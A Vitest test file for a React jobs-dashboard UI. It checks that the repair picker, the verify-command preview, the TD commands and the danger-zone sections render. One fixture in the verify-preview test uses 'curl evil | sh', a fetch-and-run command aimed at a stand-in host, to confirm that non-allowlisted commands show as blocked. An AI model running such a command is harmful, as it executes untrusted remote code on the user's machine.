import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import DangerZone from './DangerZone';
import RepairSection, { RepairPicker } from './RepairSection';
import TdCommands from './TdCommands';

describe('extracted jobs sections (issue #363)', () => {
  it('repair section renders picker and dispatch', () => {
    const html = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(html).toContain('data-testid="repair-section"');
    expect(html).toContain('data-testid="repair-picker"');
    expect(html).toContain('data-testid="repair-dispatch"');
    expect(html).toContain('data-testid="repair-status"');
  });

  it('repair abort shows only while running', () => {
    const idle = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(idle).not.toContain('data-testid="repair-abort"');
    const running = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialStatus={{
          status: 'running',
          timestamp: null,
          log_buffer: '',
          issue: 9,
          exit_code: null,
        }}
      />,
    );
    expect(running).toContain('data-testid="repair-abort"');
  });

  it('repair picker narrows options by filter text (issue #571)', () => {
    const cands = [
      { number: 12, title: 'Fix flaky CI' },
      { number: 34, title: 'Phone layout polish' },
    ];
    const html = renderToStaticMarkup(
      <RepairPicker candidates={cands} picked="" filter="flaky" onPick={() => {}} onFilter={() => {}} />,
    );
    expect(html).toContain('data-testid="repair-filter"');
    expect(html).toContain('#12 Fix flaky CI');
    expect(html).not.toContain('#34 Phone layout polish');
    expect(html).toContain('Select…');
  });

  it('repair picker explains an empty filter result', () => {
    const html = renderToStaticMarkup(
      <RepairPicker
        candidates={[{ number: 12, title: 'Fix flaky CI' }]}
        picked=""
        filter="zzz-absent"
        onPick={() => {}}
        onFilter={() => {}}
      />,
    );
    expect(html).toContain('data-testid="repair-filter-empty"');
    expect(html).toContain('Select…');
  });

  it('verify preview shows command or blocked line (issue #483)', () => {
    const ok = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPreview={{ ok: true, issue: 9, command: 'pytest tests/', allowlisted: true, error: '' }}
      />,
    );
    expect(ok).toContain('data-testid="repair-verify"');
    expect(ok).toContain('Verify: pytest tests/');
    const blocked = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPreview={{ ok: true, issue: 9, command: 'curl evil | sh', allowlisted: false, error: 'not allowlisted' }}
      />,
    );
    expect(blocked).toContain('Verify blocked: not allowlisted');
    const none = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(none).not.toContain('data-testid="repair-verify"');
  });

  it('td commands render pr and whole-repo groups', () => {
    const html = renderToStaticMarkup(
      <TdCommands
        pr="12"
        onPrChange={() => {}}
        prStateCurrent={{ n: 12, ci: 'passing', conflicted: false }}
        prOk
        fixCiBlock="CI is passing — nothing to fix."
        conflictBlock="No conflicts on this PR."
        onDispatch={() => {}}
      />,
    );
    expect(html).toContain('data-testid="td-pr-group"');
    expect(html).toContain('data-testid="td-repo-group"');
    expect(html).toContain('data-testid="td-pr"');
    expect(html).toContain('data-testid="dispatch-td-fix-ci"');
    expect(html).toContain('data-testid="dispatch-td-list-sessions"');
    expect(html).toContain('data-testid="dispatch-td-doctor"');
    expect(html).toContain('data-testid="dispatch-td-preflight"');
    expect(html).toContain('data-testid="dispatch-td-audit-pr"');
    expect(html).toContain('data-testid="dispatch-td-ai-review"');
    expect(html).toContain('data-testid="td-change-block"');
    expect(html).toContain('PR #12');
  });

  it('danger zone renders all rows with tap-to-fire actions', () => {
    const html = renderToStaticMarkup(
      <DangerZone
        mergeReady={2}
        finishedCount={1}
        runCount={3}
        onDangerAction={() => {}}
        onClear={() => {}}
        onTakeover={() => {}}
      />,
    );
    expect(html).toContain('data-testid="danger-merge-approved"');
    expect(html).toContain('data-testid="danger-clear-finished"');
    expect(html).toContain('data-testid="danger-clear-all"');
    expect(html).toContain('data-testid="danger-takeover"');
    expect(html).toContain('2 ready to merge.');
    expect(html).toContain('data-testid="tap-fire"');
  });

  it('danger zone reports zero merge-ready without the consequence line', () => {
    const html = renderToStaticMarkup(
      <DangerZone
        mergeReady={0}
        finishedCount={0}
        runCount={0}
        onDangerAction={() => {}}
        onClear={() => {}}
        onTakeover={() => {}}
      />,
    );
    expect(html).toContain('No approved, green PRs right now.');
    expect(html).toContain('Nothing finished to clear.');
    expect(html).toContain('No runs to clear.');
  });
});
